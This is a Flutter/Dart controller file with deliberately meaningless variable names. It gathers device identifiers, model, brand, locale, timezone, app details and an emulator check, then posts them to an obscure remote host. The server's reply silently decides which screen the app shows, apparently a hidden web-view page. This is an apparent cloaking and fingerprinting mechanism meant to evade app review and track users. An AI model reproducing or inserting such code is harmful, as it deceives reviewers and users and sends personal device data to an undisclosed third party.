import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var ocgpfxymew = RxBool(false);
  var ivhyrg = RxBool(true);
  var dgyzcm = RxString("");
  var edmond = RxBool(false);
  var nikolaus = RxBool(true);
  final zslwmktc = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    rnjf();
  }


  Future<void> rnjf() async {

    edmond.value = true;
    nikolaus.value = true;
    ivhyrg.value = false;

    zslwmktc.post("https://klan.lilipa.xyz/sugjpxvfdkeyhrnoz",data: await wqfgytci()).then((value) {
      var ibykmt = value.data["ibykmt"] as String;
      var wqcbx = value.data["wqcbx"] as bool;
      if (wqcbx) {
        dgyzcm.value = ibykmt;
        cheyanne();
      } else {
        mayert();
      }
    }).catchError((e) {
      ivhyrg.value = true;
      nikolaus.value = true;
      edmond.value = false;
    });
  }

  Future<Map<String, dynamic>> wqfgytci() async {
    final DeviceInfoPlugin lzgxkin = DeviceInfoPlugin();
    PackageInfo sqxvjm_etvlguk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var utopafbq = Platform.localeName;
    var lbgh = currentTimeZone;

    var lfyjmevn = sqxvjm_etvlguk.packageName;
    var xwji = sqxvjm_etvlguk.version;
    var nhruzcgy = sqxvjm_etvlguk.buildNumber;

    var zkdsvp = sqxvjm_etvlguk.appName;
    var kobeKiehn = "";
    var wqkt  = "";
    var epgl = "";
    var nilsDurgan = "";
    var tyreseWelch = "";
    var zykto = "";
    var manuelaVolkman = "";
    var alexandriaNienow = "";
    var ledaKeeling = "";


    var sbqgclm = "";
    var fnbhrsea = false;

    if (GetPlatform.isAndroid) {
      sbqgclm = "android";
      var cipjtnsv = await lzgxkin.androidInfo;

      zykto = cipjtnsv.brand;

      epgl  = cipjtnsv.model;
      wqkt = cipjtnsv.id;

      fnbhrsea = cipjtnsv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      sbqgclm = "ios";
      var zrybehn = await lzgxkin.iosInfo;
      zykto = zrybehn.name;
      epgl = zrybehn.model;

      wqkt = zrybehn.identifierForVendor ?? "";
      fnbhrsea  = zrybehn.isPhysicalDevice;
    }
    var res = {
      "zkdsvp": zkdsvp,
      "xwji": xwji,
      "lfyjmevn": lfyjmevn,
      "wqkt": wqkt,
      "epgl": epgl,
      "lbgh": lbgh,
      "nhruzcgy": nhruzcgy,
      "zykto": zykto,
      "utopafbq": utopafbq,
      "manuelaVolkman" : manuelaVolkman,
      "fnbhrsea": fnbhrsea,
      "sbqgclm": sbqgclm,
      "alexandriaNienow" : alexandriaNienow,
      "tyreseWelch" : tyreseWelch,
      "nilsDurgan" : nilsDurgan,
      "kobeKiehn" : kobeKiehn,
      "ledaKeeling" : ledaKeeling,

    };
    return res;
  }

  Future<void> mayert() async {
    Get.offAllNamed("/orderTab");
  }

  Future<void> cheyanne() async {
    Get.offAllNamed("/orderTool");
  }

}
